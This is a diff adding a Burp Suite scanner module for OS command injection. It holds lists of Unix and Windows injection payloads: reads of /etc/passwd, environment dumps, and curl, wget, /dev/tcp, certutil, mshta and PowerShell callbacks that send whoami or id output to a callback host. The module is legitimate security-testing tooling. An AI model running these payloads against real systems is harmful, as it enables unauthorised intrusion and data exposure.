@@ -1,0 +1,717 @@
+package com.omnistrike.modules.injection;
+
+import burp.api.montoya.MontoyaApi;
+import burp.api.montoya.collaborator.Interaction;
+import burp.api.montoya.http.message.HttpRequestResponse;
+import burp.api.montoya.http.message.params.HttpParameter;
+import burp.api.montoya.http.message.requests.HttpRequest;
+import com.omnistrike.framework.CollaboratorManager;
+import com.omnistrike.framework.DeduplicationStore;
+import com.omnistrike.framework.FindingsStore;
+
+import com.omnistrike.model.*;
+
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+import java.util.*;
+
+import java.util.concurrent.atomic.AtomicReference;
+import java.util.regex.Pattern;
+
+/**
+ * MODULE 10: OS Command Injection Scanner
+ * Detects command injection via time-based payloads (sleep/ping delays),
+ * error-based output detection, and OOB via Burp Collaborator (DNS/HTTP callbacks).
+ * Supports Unix and Windows command separators.
+ */
+public class CommandInjectionScanner implements ScanModule {
+
+    private MontoyaApi api;
+    private ModuleConfig config;
+    private DeduplicationStore dedup;
+    private FindingsStore findingsStore;
+    private CollaboratorManager collaboratorManager;
+
+    // Command separators for both Unix and Windows
+    private static final String[] UNIX_SEPARATORS = {
+            ";", "|", "||", "&&", "\n", "`", "$(",
+    };
+    private static final String[] WINDOWS_SEPARATORS = {
+            "&", "&&", "|", "||", "\n",
+    };
+
+    // Time-based payloads: each pair is [payload_template, expected_delay_seconds]
+    // SLEEP_SECS is replaced with the configured delay
+    private static final String[][] UNIX_TIME_PAYLOADS = {
+            // sleep command
+            {";sleep SLEEP_SECS;", "sleep"},
+            {"|sleep SLEEP_SECS|", "sleep"},
+            {"||sleep SLEEP_SECS||", "sleep"},
+            {"&&sleep SLEEP_SECS&&", "sleep"},
+            {"`sleep SLEEP_SECS`", "sleep"},
+            {"$(sleep SLEEP_SECS)", "sleep"},
+            {"\nsleep SLEEP_SECS\n", "sleep"},
+            {";sleep SLEEP_SECS #", "sleep"},
+            {"| sleep SLEEP_SECS #", "sleep"},
+            // ping (alternative when sleep is unavailable)
+            {";ping -c SLEEP_SECS 127.0.0.1;", "ping"},
+            {"|ping -c SLEEP_SECS 127.0.0.1|", "ping"},
+            {"$(ping -c SLEEP_SECS 127.0.0.1)", "ping"},
+            // Newline (%0a) as separator
+            {"%0asleep SLEEP_SECS%0a", "sleep-newline"},
+            // $IFS space bypass
+            {";sleep${IFS}SLEEP_SECS;", "sleep-IFS"},
+            {"|sleep${IFS}SLEEP_SECS", "sleep-IFS-pipe"},
+            // Environment variable concatenation
+            {";sl${EMPTY}eep SLEEP_SECS;", "sleep-envconcat"},
+            // Backtick nesting
+            {"$(sleep `echo SLEEP_SECS`)", "sleep-backtick-nest"},
+            // CRLF injection
+            {"%0d%0asleep SLEEP_SECS%0d%0a", "sleep-crlf"},
+            // Tab as separator
+            {";sleep\tSLEEP_SECS;", "sleep-tab"},
+            // Brace expansion
+            {"{sleep,SLEEP_SECS}", "sleep-brace"},
+            // Double-encoded newline
+            {"%250asleep SLEEP_SECS%250a", "sleep-double-newline"},
+            // Concatenation bypass
+            {"';sleep SLEEP_SECS;'", "sleep-quote-break"},
+            {"\"| sleep SLEEP_SECS", "sleep-dquote-pipe"},
+            // $() with IFS
+            {"$(sleep${IFS}SLEEP_SECS)", "sleep-subshell-IFS"},
+            // Here string
+            {"<<<$(sleep SLEEP_SECS)", "sleep-herestring"},
+            // Wildcard-based (using PATH globbing)
+            {"/???/??e?p SLEEP_SECS", "sleep-glob"},
+            // Python one-liner
+            {";python3 -c 'import time;time.sleep(SLEEP_SECS)';", "python-sleep"},
+            {";python -c 'import time;time.sleep(SLEEP_SECS)';", "python2-sleep"},
+            // Perl one-liner
+            {";perl -e 'sleep SLEEP_SECS';", "perl-sleep"},
+            // Ruby one-liner
+            {";ruby -e 'sleep SLEEP_SECS';", "ruby-sleep"},
+            // PHP one-liner
+            {";php -r 'sleep(SLEEP_SECS);';", "php-sleep"},
+    };
+
+    private static final String[][] WINDOWS_TIME_PAYLOADS = {
+            {"& ping -n SLEEP_SECS 127.0.0.1 &", "ping"},
+            {"| ping -n SLEEP_SECS 127.0.0.1 |", "ping"},
+            {"&& ping -n SLEEP_SECS 127.0.0.1 &&", "ping"},
+            {"|| ping -n SLEEP_SECS 127.0.0.1 ||", "ping"},
+            {"& timeout /T SLEEP_SECS /NOBREAK &", "timeout"},
+            {"\nping -n SLEEP_SECS 127.0.0.1\n", "ping"},
+            // PowerShell
+            {"& powershell Start-Sleep -Seconds SLEEP_SECS &", "powershell"},
+            // waitfor command
+            {"& waitfor /T SLEEP_SECS omni 2>nul &", "waitfor"},
+            // PowerShell sleep variants
+            {"& powershell -c \"Start-Sleep SLEEP_SECS\" &", "powershell-c"},
+            {"& powershell -enc BASE64SLEEP &", "powershell-enc"},
+            // choice command
+            {"& choice /C Y /T SLEEP_SECS /D Y >nul &", "choice"},
+            // pathping delay
+            {"& pathping -q 1 -p SLEEP_SECS000 127.0.0.1 &", "pathping"},
+            // cmd /c chained
+            {"| cmd /c ping -n SLEEP_SECS 127.0.0.1", "cmd-c-ping"},
+    };
+
+    // Error/output-based payloads — look for specific output in response
+    private static final String[][] OUTPUT_PAYLOADS_UNIX = {
+            {";id;", "uid=", "id command (Unix)"},
+            {"|id|", "uid=", "id command piped (Unix)"},
+            {"$(id)", "uid=", "id via subshell (Unix)"},
+            {"`id`", "uid=", "id via backtick (Unix)"},
+            {";cat /etc/passwd;", "root:", "/etc/passwd read (Unix)"},
+            {"|cat /etc/passwd", "root:", "/etc/passwd piped (Unix)"},
+            {"$(cat /etc/passwd)", "root:", "/etc/passwd subshell (Unix)"},
+            {";uname -a;", "Linux", "uname (Unix)"},
+            {"|uname -a", "Linux", "uname piped (Unix)"},
+            {";echo cmdi_confirmed;", "cmdi_confirmed", "echo marker (Unix)"},
+            {"|echo cmdi_confirmed", "cmdi_confirmed", "echo marker piped (Unix)"},
+            {"$(echo cmdi_confirmed)", "cmdi_confirmed", "echo marker subshell (Unix)"},
+            // Newline separator
+            {"%0aid%0a", "uid=", "id via newline (Unix)"},
+            // $IFS space bypass
+            {";cat${IFS}/etc/passwd;", "root:", "/etc/passwd via IFS (Unix)"},
+            // expr math marker for blind output detection
+            {";expr 41 + 1;", "42", "expr math marker (Unix)"},
+            {"$(expr 41 + 1)", "42", "expr math subshell (Unix)"},
+            // Backtick nesting with $IFS
+            {"`cat${IFS}/etc/passwd`", "root:", "/etc/passwd via IFS backtick (Unix)"},
+            // whoami
+            {";whoami;", "REGEX:\\w+", "whoami (Unix)"},
+            {"|whoami", "REGEX:\\w+", "whoami piped (Unix)"},
+            {"$(whoami)", "REGEX:\\w+", "whoami subshell (Unix)"},
+            // hostname
+            {";hostname;", "", "hostname (Unix)"},
+            // env/printenv
+            {";env;", "PATH=", "env dump (Unix)"},
+            {";printenv;", "PATH=", "printenv (Unix)"},
+            // ifconfig/ip
+            {";ifconfig 2>/dev/null||ip addr;", "inet", "ifconfig/ip (Unix)"},
+            // ls
+            {";ls /;", "bin", "ls root (Unix)"},
+            {"|ls /", "bin", "ls root piped (Unix)"},
+            // pwd
+            {";pwd;", "/", "pwd (Unix)"},
+            // Perl execution
+            {";perl -e 'print 42';", "42", "perl eval (Unix)"},
+            // Python execution
+            {";python3 -c 'print(42)';", "42", "python3 eval (Unix)"},
+            // Ruby execution
+            {";ruby -e 'puts 42';", "42", "ruby eval (Unix)"},
+            // PHP execution
+            {";php -r 'echo 42;';", "42", "php eval (Unix)"},
+            // cat /proc/version
+            {";cat /proc/version;", "Linux version", "/proc/version (Unix)"},
+            // Curl-based output
+            {"|curl -s file:///etc/passwd", "root:", "curl file proto (Unix)"},
+    };
+
+    private static final String[][] OUTPUT_PAYLOADS_WINDOWS = {
+            {"& whoami &", "REGEX:\\w+\\\\\\w+", "whoami (Windows)"},
+            {"| whoami", "REGEX:\\w+\\\\\\w+", "whoami piped (Windows)"},
+            {"& type C:\\Windows\\win.ini &", "[fonts]", "win.ini read (Windows)"},
+            {"| type C:\\Windows\\win.ini", "[fonts]", "win.ini piped (Windows)"},
+            {"& echo cmdi_confirmed &", "cmdi_confirmed", "echo marker (Windows)"},
+            {"| echo cmdi_confirmed", "cmdi_confirmed", "echo marker piped (Windows)"},
+            {"& hostname &", "", "hostname (Windows)"},
+            {"& ver &", "Microsoft Windows", "ver command (Windows)"},
+            // set /a math marker
+            {"& set /a 41+1 &", "42", "set /a math marker (Windows)"},
+            // Newline separator
+            {"%0awhoami%0a", "REGEX:\\w+\\\\\\w+", "whoami via newline (Windows)"},
+            // cmd /c echo
+            {"& cmd /c echo cmdi_confirmed &", "cmdi_confirmed", "cmd /c echo marker (Windows)"},
+            // ipconfig
+            {"& ipconfig &", "IPv4", "ipconfig (Windows)"},
+            // systeminfo
+            {"& systeminfo &", "OS Name", "systeminfo (Windows)"},
+            // dir
+            {"& dir C:\\ &", "Volume", "dir C: (Windows)"},
+            // net user
+            {"& net user &", "Administrator", "net user (Windows)"},
+            // tasklist
+            {"& tasklist &", ".exe", "tasklist (Windows)"},
+            // wmic
+            {"& wmic os get caption &", "Windows", "wmic os (Windows)"},
+            // PowerShell expressions
+            {"& powershell -c \"Write-Output cmdi_confirmed\" &", "cmdi_confirmed", "powershell output (Windows)"},
+            {"& powershell -c \"[System.Environment]::OSVersion\" &", "Microsoft", "powershell OSVersion (Windows)"},
+    };
+
+    // OOB payloads using Collaborator (COLLAB_PLACEHOLDER replaced at runtime)
+    private static final String[][] OOB_PAYLOADS_UNIX = {
+            {";nslookup COLLAB_PLACEHOLDER;", "nslookup (Unix)"},
+            {"|nslookup COLLAB_PLACEHOLDER", "nslookup piped (Unix)"},
+            {"$(nslookup COLLAB_PLACEHOLDER)", "nslookup subshell (Unix)"},
+            {"`nslookup COLLAB_PLACEHOLDER`", "nslookup backtick (Unix)"},
+            {";curl http://COLLAB_PLACEHOLDER/cmdi;", "curl (Unix)"},
+            {"|curl http://COLLAB_PLACEHOLDER/cmdi", "curl piped (Unix)"},
+            {"$(curl http://COLLAB_PLACEHOLDER/cmdi)", "curl subshell (Unix)"},
+            {";wget http://COLLAB_PLACEHOLDER/cmdi;", "wget (Unix)"},
+            {";ping -c 1 COLLAB_PLACEHOLDER;", "ping (Unix)"},
+            {"|ping -c 1 COLLAB_PLACEHOLDER", "ping piped (Unix)"},
+            {";host COLLAB_PLACEHOLDER;", "host lookup (Unix)"},
+            {";dig COLLAB_PLACEHOLDER;", "dig lookup (Unix)"},
+            // Newline separator nslookup
+            {"%0anslookup COLLAB_PLACEHOLDER%0a", "nslookup newline (Unix)"},
+            // $IFS variants
+            {";nslookup${IFS}COLLAB_PLACEHOLDER;", "nslookup IFS (Unix)"},
+            {"|curl${IFS}http://COLLAB_PLACEHOLDER/cmdi", "curl IFS piped (Unix)"},
+            // Python popen
+            {";python -c \"import os;os.popen('nslookup COLLAB_PLACEHOLDER')\" ;", "python popen (Unix)"},
+            // curl POST with data exfil
+            {";curl http://COLLAB_PLACEHOLDER/$(whoami);", "curl whoami exfil (Unix)"},
+            {";wget -q http://COLLAB_PLACEHOLDER/$(id|base64) -O /dev/null;", "wget id exfil (Unix)"},
+            // Perl OOB
+            {";perl -e 'use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>\"COLLAB_PLACEHOLDER\",PeerPort=>80)';", "perl socket (Unix)"},
+            // Python OOB
+            {";python3 -c 'import socket;socket.socket().connect((\"COLLAB_PLACEHOLDER\",80))';", "python3 socket (Unix)"},
+            {";python -c 'import urllib;urllib.urlopen(\"http://COLLAB_PLACEHOLDER/cmdi\")';", "python urllib (Unix)"},
+            // Ruby OOB
+            {";ruby -e 'require\"net/http\";Net::HTTP.get(URI(\"http://COLLAB_PLACEHOLDER/cmdi\"))';", "ruby http (Unix)"},
+            // PHP OOB
+            {";php -r 'file_get_contents(\"http://COLLAB_PLACEHOLDER/cmdi\");';", "php file_get (Unix)"},
+            // openssl OOB
+            {";openssl s_client -connect COLLAB_PLACEHOLDER:443 2>/dev/null;", "openssl connect (Unix)"},
+            // bash /dev/tcp
+            {";bash -c 'echo > /dev/tcp/COLLAB_PLACEHOLDER/80';", "bash dev-tcp (Unix)"},
+            // nc/netcat
+            {";nc -z COLLAB_PLACEHOLDER 80;", "netcat (Unix)"},
+    };
+
+    private static final String[][] OOB_PAYLOADS_WINDOWS = {
+            {"& nslookup COLLAB_PLACEHOLDER &", "nslookup (Windows)"},
+            {"| nslookup COLLAB_PLACEHOLDER", "nslookup piped (Windows)"},
+            {"& ping -n 1 COLLAB_PLACEHOLDER &", "ping (Windows)"},
+            {"| ping -n 1 COLLAB_PLACEHOLDER", "ping piped (Windows)"},
+            {"& certutil -urlcache -split -f http://COLLAB_PLACEHOLDER/cmdi &", "certutil (Windows)"},
+            {"& powershell Invoke-WebRequest http://COLLAB_PLACEHOLDER/cmdi &", "powershell IWR (Windows)"},
+            {"& powershell (New-Object Net.WebClient).DownloadString('http://COLLAB_PLACEHOLDER/cmdi') &", "powershell WebClient (Windows)"},
+            // PowerShell DNS resolution
+            {"& powershell -c \"Resolve-DnsName COLLAB_PLACEHOLDER\" &", "powershell DNS (Windows)"},
+            // PowerShell Net.Sockets
+            {"& powershell -c \"(New-Object Net.Sockets.TcpClient).Connect('COLLAB_PLACEHOLDER',80)\" &", "powershell TCP (Windows)"},
+            // bitsadmin
+            {"& bitsadmin /transfer omni http://COLLAB_PLACEHOLDER/cmdi %temp%\\omni &", "bitsadmin (Windows)"},
+            // mshta
+            {"& mshta http://COLLAB_PLACEHOLDER/cmdi &", "mshta (Windows)"},
+            // rundll32
+            {"& rundll32 url.dll,FileProtocolHandler http://COLLAB_PLACEHOLDER/cmdi &", "rundll32 (Windows)"},
+            // explorer
+            {"& start http://COLLAB_PLACEHOLDER/cmdi &", "start URL (Windows)"},
+            // wmic process call
+            {"& wmic process call create \"cmd /c nslookup COLLAB_PLACEHOLDER\" &", "wmic process (Windows)"},
+            // curl (modern Windows)
+            {"& curl http://COLLAB_PLACEHOLDER/cmdi &", "curl (Windows)"},
+    };
+
+    @Override
+    public String getId() { return "cmdi-scanner"; }
+
+    @Override
+    public String getName() { return "Command Injection Scanner"; }
+
+    @Override
+    public String getDescription() {
+        return "OS command injection via time-based delays, output detection, and OOB (Collaborator) for Unix and Windows.";
+    }
+
+    @Override
+    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
+
+    @Override
+    public boolean isPassive() { return false; }
+
+    @Override
+    public void initialize(MontoyaApi api, ModuleConfig config) {
+        this.api = api;
+        this.config = config;
+    }
+
+    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
+                                 CollaboratorManager collaboratorManager) {
+        this.dedup = dedup;
+        this.findingsStore = findingsStore;
+        this.collaboratorManager = collaboratorManager;
+    }
+
+    @Override
+    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
+        HttpRequest request = requestResponse.request();
+        String urlPath = extractPath(request.url());
+        List<CmdiTarget> targets = extractTargets(request);
+
+        for (CmdiTarget target : targets) {
+            if (!dedup.markIfNew("cmdi-scanner", urlPath, target.name)) continue;
+
+            try {
+                testCommandInjection(requestResponse, target);
+            } catch (Exception e) {
+                api.logging().logToError("CmdI test error on " + target.name + ": " + e.getMessage());
+            }
+        }
+
+        return Collections.emptyList();
+    }
+
+    private void testCommandInjection(HttpRequestResponse original, CmdiTarget target) throws InterruptedException {
+        String url = original.request().url();
+        int delaySecs = config.getInt("cmdi.delaySecs", 5);
+
+        // Phase 1: Baseline (multi-measurement for accuracy)
+        TimedResult baselineResult = measureResponseTime(original, target, target.originalValue);
+        long baselineTime = baselineResult.elapsedMs;
+        HttpRequestResponse baseline = baselineResult.response;
+        String baselineBody = baseline != null && baseline.response() != null
+                ? baseline.response().bodyToString() : "";
+
+        // Take 2 additional baseline measurements and use the maximum
+        TimedResult b2 = measureResponseTime(original, target, target.originalValue);
+        TimedResult b3 = measureResponseTime(original, target, target.originalValue);
+        baselineTime = Math.max(baselineTime, Math.max(
+                b2.response != null ? b2.elapsedMs : 0,
+                b3.response != null ? b3.elapsedMs : 0));
+
+        // Phase 2: Time-based detection (Unix)
+        if (config.getBool("cmdi.unix.enabled", true)) {
+            if (testTimeBased(original, target, url, baselineTime, delaySecs, UNIX_TIME_PAYLOADS, "Unix")) return;
+        }
+
+        // Phase 3: Time-based detection (Windows)
+        if (config.getBool("cmdi.windows.enabled", true)) {
+            if (testTimeBased(original, target, url, baselineTime, delaySecs, WINDOWS_TIME_PAYLOADS, "Windows")) return;
+        }
+
+        // Phase 4: Output-based detection (Unix)
+        if (config.getBool("cmdi.output.enabled", true)) {
+            if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_UNIX, "Unix")) return;
+        }
+
+        // Phase 5: Output-based detection (Windows)
+        if (config.getBool("cmdi.output.enabled", true)) {
+            if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_WINDOWS, "Windows")) return;
+        }
+
+        // Phase 6: OOB via Collaborator
+        if (config.getBool("cmdi.oob.enabled", true)
+                && collaboratorManager != null && collaboratorManager.isAvailable()) {
+            testOob(original, target, url);
+        }
+    }
+
+    // ==================== TIME-BASED DETECTION ====================
+
+    private boolean testTimeBased(HttpRequestResponse original, CmdiTarget target, String url,
+                                   long baselineTime, int delaySecs, String[][] payloads, String osType)
+            throws InterruptedException {
+
+        int thresholdMs = (delaySecs - 1) * 1000; // e.g., 4s threshold for 5s sleep
+
+        for (String[] payloadInfo : payloads) {
+            String payloadTemplate = payloadInfo[0];
+            String technique = payloadInfo[1];
+            String payload = payloadTemplate.replace("SLEEP_SECS", String.valueOf(delaySecs));
+
+
+            TimedResult result1 = measureResponseTime(original, target, target.originalValue + payload);
+
+            if (result1.elapsedMs >= baselineTime + thresholdMs) {
+                // Confirm with second attempt
+
+                TimedResult result2 = measureResponseTime(original, target, target.originalValue + payload);
+
+                if (result2.elapsedMs >= baselineTime + thresholdMs) {
+                    // Double-confirmed
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "OS Command Injection (Time-Based) - " + osType,
+                                    Severity.CRITICAL, Confidence.FIRM)
+                            .url(url).parameter(target.name)
+                            .evidence("Technique: " + technique + " (" + osType + ")"
+                                    + " | Payload: " + payload
+                                    + " | Baseline: " + baselineTime + "ms"
+                                    + " | Attempt 1: " + result1.elapsedMs + "ms"
+                                    + " | Attempt 2: " + result2.elapsedMs + "ms"
+                                    + " | Expected delay: " + delaySecs + "s")
+                            .description("Time-based OS command injection confirmed (double-tap). "
+                                    + "The server delayed by ~" + delaySecs + " seconds when "
+                                    + technique + " was injected via " + osType + " syntax. "
+                                    + "Parameter '" + target.name + "' is injectable.")
+                            .requestResponse(result2.response)
+                            .build());
+                    return true;
+                } else {
+                    // Single hit — tentative
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "Potential Command Injection (Time-Based) - " + osType,
+                                    Severity.HIGH, Confidence.TENTATIVE)
+                            .url(url).parameter(target.name)
+                            .evidence("Technique: " + technique + " (" + osType + ")"
+                                    + " | Payload: " + payload
+                                    + " | Single hit: " + result1.elapsedMs + "ms (baseline: " + baselineTime + "ms)")
+                            .description("Single time-delay hit. Could be network latency. "
+                                    + "Retest recommended.")
+                            .requestResponse(result1.response)
+                            .build());
+                }
+            }
+            perHostDelay();
+        }
+        return false;
+    }
+
+    // ==================== OUTPUT-BASED DETECTION ====================
+
+    private boolean testOutputBased(HttpRequestResponse original, CmdiTarget target, String url,
+                                     String baselineBody, String[][] payloads, String osType)
+            throws InterruptedException {
+
+        for (String[] payloadInfo : payloads) {
+            String payload = payloadInfo[0];
+            String expectedOutput = payloadInfo[1];
+            String technique = payloadInfo[2];
+
+
+            HttpRequestResponse result = sendPayload(original, target, target.originalValue + payload);
+            if (result == null || result.response() == null) continue;
+
+            String body = result.response().bodyToString();
+
+            if (!expectedOutput.isEmpty()) {
+                boolean matched;
+                boolean baselineMatched;
+
+                if (expectedOutput.startsWith("REGEX:")) {
+                    // Regex-based matching (e.g., for DOMAIN\User whoami output)
+                    Pattern regexPattern = Pattern.compile(expectedOutput.substring(6));
+                    matched = regexPattern.matcher(body).find();
+                    baselineMatched = regexPattern.matcher(baselineBody).find();
+                } else {
+                    // Simple string contains matching
+                    matched = body.contains(expectedOutput);
+                    baselineMatched = baselineBody.contains(expectedOutput);
+                }
+
+                if (matched && !baselineMatched) {
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "OS Command Injection (Output-Based) - " + osType,
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter(target.name)
+                            .evidence("Technique: " + technique
+                                    + " | Payload: " + payload
+                                    + " | Output found: " + expectedOutput)
+                            .description("Command injection confirmed. Command output matching '"
+                                    + expectedOutput + "' found in response via " + technique + ". "
+                                    + "Parameter '" + target.name + "' allows OS command execution.")
+                            .requestResponse(result)
+                            .build());
+                    return true;
+                }
+            }
+            perHostDelay();
+        }
+        return false;
+    }
+
+    // ==================== OOB VIA COLLABORATOR ====================
+
+    private void testOob(HttpRequestResponse original, CmdiTarget target, String url) throws InterruptedException {
+        // Unix OOB payloads
+        if (config.getBool("cmdi.unix.enabled", true)) {
+            for (String[] payloadInfo : OOB_PAYLOADS_UNIX) {
+                sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Unix");
+            }
+        }
+
+        // Windows OOB payloads
+        if (config.getBool("cmdi.windows.enabled", true)) {
+            for (String[] payloadInfo : OOB_PAYLOADS_WINDOWS) {
+                sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Windows");
+            }
+        }
+    }
+
+    private void sendOobPayload(HttpRequestResponse original, CmdiTarget target,
+                                 String url, String payloadTemplate, String technique, String osType)
+            throws InterruptedException {
+
+        // AtomicReference to capture the sent request/response for the finding
+        AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+
+        String collabPayload = collaboratorManager.generatePayload(
+                "cmdi-scanner", url, target.name,
+                "CmdI OOB " + technique,
+                interaction -> {
+                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                    "OS Command Injection (Out-of-Band) - " + osType,
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter(target.name)
+                            .evidence("Technique: " + technique + " (" + osType + ")"
+                                    + " | Collaborator " + interaction.type().name()
+                                    + " interaction from " + interaction.clientIp()
+                                    + " at " + interaction.timeStamp())
+                            .description("OS command injection confirmed via Burp Collaborator. "
+                                    + "The server executed " + technique + " which triggered a "
+                                    + interaction.type().name() + " callback. "
+                                    + "Parameter '" + target.name + "' allows arbitrary command execution.")
+                            .requestResponse(sentRequest.get())
+                            .build());
+                    api.logging().logToOutput("[CmdI OOB] Confirmed! " + interaction.type()
+                            + " interaction for " + url + " param=" + target.name
+                            + " technique=" + technique + " OS=" + osType);
+                }
+        );
+
+        if (collabPayload == null) return;
+
+        String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);
+
+
+        sentRequest.set(sendPayload(original, target, target.originalValue + payload));
+
+        api.logging().logToOutput("[CmdI OOB] Sent " + technique + " payload to " + url
+                + " param=" + target.name + " collab=" + collabPayload);
+
+        perHostDelay();
+    }
+
+    // ==================== HELPERS ====================
+
+    private HttpRequestResponse sendPayload(HttpRequestResponse original, CmdiTarget target, String payload) {
+        try {
+            HttpRequest modified = injectPayload(original.request(), target, payload);
+            return api.http().sendRequest(modified);
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    /** Result of a timed request, bundling elapsed time and the response together to avoid races. */
+    private static class TimedResult {
+        final long elapsedMs;
+        final HttpRequestResponse response;
+        TimedResult(long elapsedMs, HttpRequestResponse response) {
+            this.elapsedMs = elapsedMs;
+            this.response = response;
+        }
+    }
+
+    private TimedResult measureResponseTime(HttpRequestResponse original, CmdiTarget target, String payload) {
+        long start = System.currentTimeMillis();
+        HttpRequestResponse response = sendPayload(original, target, payload);
+        long elapsed = System.currentTimeMillis() - start;
+        return new TimedResult(elapsed, response);
+    }
+
+    private HttpRequest injectPayload(HttpRequest request, CmdiTarget target, String payload) {
+        switch (target.type) {
+            case QUERY:
+                return request.withUpdatedParameters(
+                        HttpParameter.urlParameter(target.name,
+                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+            case BODY:
+                return request.withUpdatedParameters(
+                        HttpParameter.bodyParameter(target.name,
+                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+            case COOKIE:
+                return request.withUpdatedParameters(
+                        HttpParameter.cookieParameter(target.name, payload));
+            case JSON:
+                String body = request.bodyToString();
+                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
+                if (target.name.contains(".")) {
+                    // Nested key — parse, replace, serialize
+                    String newBody = replaceNestedJsonValue(body, target.name, escaped);
+                    return request.withBody(newBody);
+                } else {
+                    String pattern = "\"" + java.util.regex.Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
+                    String replacement = "\"" + target.name + "\": \"" + escaped + "\"";
+                    return request.withBody(body.replaceFirst(pattern, replacement));
+                }
+            case HEADER:
+                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
+            default:
+                return request;
+        }
+    }
+
+    /**
+     * Replace a value at a dot-notation path in a JSON string.
+     * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
+     */
+    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
+        try {
+            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
+            if (!root.isJsonObject()) return jsonBody;
+
+            String[] parts = dotPath.split("\\.");
+            com.google.gson.JsonObject current = root.getAsJsonObject();
+
+            // Traverse to the parent of the target key
+            for (int i = 0; i < parts.length - 1; i++) {
+                com.google.gson.JsonElement child = current.get(parts[i]);
+                if (child == null || !child.isJsonObject()) return jsonBody;
+                current = child.getAsJsonObject();
+            }
+
+            // Replace the leaf value
+            String leafKey = parts[parts.length - 1];
+            if (current.has(leafKey)) {
+                current.addProperty(leafKey, escapedValue);
+            }
+
+            return new com.google.gson.Gson().toJson(root);
+        } catch (Exception e) {
+            return jsonBody;
+        }
+    }
+
+    private List<CmdiTarget> extractTargets(HttpRequest request) {
+        List<CmdiTarget> targets = new ArrayList<>();
+        for (var param : request.parameters()) {
+            switch (param.type()) {
+                case URL:
+                    targets.add(new CmdiTarget(param.name(), param.value(), CmdiTargetType.QUERY));
+                    break;
+                case BODY:
+                    targets.add(new CmdiTarget(param.name(), param.value(), CmdiTargetType.BODY));
+                    break;
+                case COOKIE:
+                    targets.add(new CmdiTarget(param.name(), param.value(), CmdiTargetType.COOKIE));
+                    break;
+            }
+        }
+        // JSON body params (recursive for nested objects)
+        String ct = "";
+        for (var h : request.headers()) {
+            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
+        }
+        if (ct.contains("application/json")) {
+            try {
+                String body = request.bodyToString();
+                if (body != null) {
+                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
+                    if (el.isJsonObject()) {
+                        extractJsonParams(el.getAsJsonObject(), "", targets);
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
+
+        // Extract injectable request headers
+        String[] headerTargets = {"User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "Origin"};
+        for (String headerName : headerTargets) {
+            for (var h : request.headers()) {
+                if (h.name().equalsIgnoreCase(headerName)) {
+                    targets.add(new CmdiTarget(h.name(), h.value(), CmdiTargetType.HEADER));
+                    break;
+                }
+            }
+        }
+
+        return targets;
+    }
+
+    /**
+     * Recursively extract JSON parameters using dot-notation for nested objects.
+     */
+    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<CmdiTarget> targets) {
+        for (String key : obj.keySet()) {
+            com.google.gson.JsonElement val = obj.get(key);
+            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
+            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
+                targets.add(new CmdiTarget(fullKey, val.getAsString(), CmdiTargetType.JSON));
+            } else if (val.isJsonObject()) {
+                extractJsonParams(val.getAsJsonObject(), fullKey, targets);
+            }
+        }
+    }
+
+    private String extractPath(String url) {
+        try {
+            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
+            int s = url.indexOf('/');
+            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
+        } catch (Exception ignored) {}
+        return url;
+    }
+
+    private void perHostDelay() throws InterruptedException {
+        int delay = config.getInt("cmdi.perHostDelay", 500);
+        if (delay > 0) Thread.sleep(delay);
+    }
+
+    @Override
+    public void destroy() { }
+
+    private enum CmdiTargetType { QUERY, BODY, COOKIE, JSON, HEADER }
+
+    private static class CmdiTarget {
+        final String name, originalValue;
+        final CmdiTargetType type;
+        CmdiTarget(String n, String v, CmdiTargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
+    }
+
+}
